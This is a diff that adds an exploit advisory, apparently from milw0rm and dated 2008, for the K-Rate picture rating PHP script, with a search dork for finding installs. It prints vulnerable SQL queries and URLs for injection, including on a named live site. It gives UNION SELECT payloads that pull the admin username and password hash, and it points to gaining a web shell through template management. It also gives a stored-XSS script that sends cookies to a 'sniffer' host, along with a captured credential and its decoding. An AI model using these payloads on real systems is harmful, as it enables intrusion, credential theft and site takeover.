@@ -1,0 +1,127 @@
+================================================================================
+|| K-Rate SQL-INJECTION, XSS                          
+================================================================================
+
+Application: K-Rate
+------------
+
+Website: http://turn-k.net/k-rate
+--------
+
+Demo: http://kratedemo.com
+-----
+
+Version: All
+--------
+
+About: K-Rate picture rating script. Price 115$.
+------
+
+Googledork: Powered by K-Rate
+-----------
+
+Date: 01-07-2008
+-----
+
+Description:
+------------
+
+1) SQL-injection
+2) Active XSS
+3) Passive XSS
+
+
+[ SOME VULNERABLE CODE ]
+
+
+[ admin/includes/dele_cpac.php ] 
+
+$result = mysql_query("SELECT * FROM $admtable WHERE a_id=$id") or die (mysql_error());
+
+
+[payments/payment_received.php]
+
+$res = mysql_query("SELECT * FROM $paytable WHERE p_id=$ord[order_id]") or die(mysql_error());
+
+
+[includes/functions.php]
+
+function id_to_url($id) {
+        global $linktable;
+        $result = mysql_query("SELECT l_url FROM $linktable WHERE l_id=$id") or die(mysql_error());
+	 ...
+
+if (mysql_affected_rows() == 0) {
+$r = mysql_query("SELECT l_cat FROM $linktable WHERE l_id=$id");
+
+
+[modules/chat.php]
+
+if ($act == 'users') {
+$res = sql_query("SELECT * FROM $chatonlinetable LEFT JOIN $membtable ON $membtable.m_id=$chatonlinetable.co_user WHERE co_room=$room ORDER BY co_user ASC");
+
+
+[ SQL-INJECTION ]
+
+*) http://host/index.php?req=online&show=1[SQL]
+*) http://host/room/1[SQL]
+*) http://raterally.com/index.php?req=view&user=somegirl&id=2[SQL]&act=vote&image=3&voter=12&vote=3
+*) http://raterally.com/index.php?req=view&user=somegirl&id=2&act=vote&image=3[SQL]&voter=12&vote=3
+*) http://raterally.com/blog/somegirl[SQL]
+*) http://raterally.com/index.php?req=blog_edit&id=1[SQL]
+
+and other other other...
+
+===>>> Exploit:
+
+Must be authenticated as a regular user.
+
+http://host/index.php?req=blog_edit&id=-1 union select 1,2,version(),4,5,6/*
+
+http://host/room/-1 union select 1,version(),3,4/*
+
+http://host/index.php?req=blog_edit&id=-1 union select 1,2,adm_user,4,5,6 from rate_admins where adm_id=1/* 
+
+http://host/index.php?req=blog_edit&id=-1 union select 1,2,adm_pass,4,5,6 from rate_admins where adm_id=1/*   
+
+/* Admin Login -  http://host/admin 
+
+Manage Templates => web-shell */
+
+[ ACTIVE XSS ]
+
+*) in blog
+*) in gallery
+*) in forum
+
+===>>> Exploit:
+
+<script>img = new Image(); img.src = "http://sniffer/sniff.jpg?"+document.cookie;</script>
+
+In sniff-log: 
+YToyOntzOjQ6InVzZXIiO3M6NjoiY29yd2luIjtzOjQ6InBhc3MiO3M6MzI6IjFlOGVjNTkzMGE4ODk5MmU4MDJjZDFiYWU2YzA1OWNmIjt9
+
+Decode:
+
+<?php
+echo base64_decode("YToyOntzOjQ6InVzZXIiO3M6NjoiY29yd2luIjtzOjQ6InBhc3MiO3M6MzI6IjFlOGVjNTkzMGE4ODk5MmU4MDJjZDFiYWU2YzA1OWNmIjt9=");
+?>
+
+Login and password (MD5):
+
+a:2:{s:4:\"user\";s:6:\"corwin\";s:4:\"pass\";s:32:\"1e8ec5930a88992e802cd1bae6c059cf\";}
+
+[ PASSIVE XSS  :)  ]
+
+http://host/index.php?req=view&user=somegirl&id=2&act=vote&image=3&voter=12&vote=3[XSS]
+
+and other other bugz ...
+
+
+Author: Corwin
+-------                                     
+	
+Contact: corwin88[dog]mail[dot]ru
+--------
+
+# milw0rm.com [2008-08-26]
